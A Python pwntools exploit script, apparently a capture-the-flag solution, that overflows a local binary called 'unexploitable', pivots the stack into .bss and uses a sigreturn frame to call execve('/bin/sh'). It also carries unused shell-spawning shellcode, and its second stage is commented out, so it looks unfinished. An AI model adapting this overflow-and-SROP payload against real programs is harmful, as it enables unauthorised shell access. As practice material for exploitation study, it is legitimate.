import struct, time
import pwn

BINARY = './unexploitable'
MAIN_ADDR = 0x400544
READ_ADDR = 0x40055B
SYSCALL_ADDR = 0x400560
BSS_ADDR = 0x601000

shellcode = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"

pwn.context.clear(arch='amd64')

def main():
	
	frame = pwn.SigreturnFrame(kernel='amd64')
	frame.rax = 0x3b # sys_execve
	frame.rdi = BSS_ADDR + 0x200 # bin_sh addr
	# frame.rsp = SYSCALL_ADDR
	frame.rip = SYSCALL_ADDR

	sys_addr = struct.pack("<Q", SYSCALL_ADDR)
	ret_addr = struct.pack("<Q", READ_ADDR)
	new_rbp = struct.pack("<Q", BSS_ADDR + 0x210)
	payload = ''
	payload += 'A' * 16		# padding
	payload += new_rbp 		# set rbp to BSS
	payload += ret_addr 	# read /bin/sh into .BSS
	
	payload += 'B' * 8 		# new rsp value
	payload += sys_addr   	# after we insert input, will be called to invoke sigreturn
	payload += str(frame)	# sigframe at 'top' of the stack

	second_payload = '/bin/sh\x00' # write our lovely string
	second_payload += (0x0f-len(second_payload))*'C' # make sure rax is sigreturn syscall

	p = pwn.process(BINARY)
	print ('[+] Process activated..')
	time.sleep(3.5)

	p.send(payload)
	print ('[+] First payload sent..')
	time.sleep(0.5)

	p.interactive()
	'''
	p.send(second_payload)
	print ('[+] Second payload sent..')
	time.sleep(0.5)

	p.interactive()
	'''

	return


if __name__ == '__main__':
	main()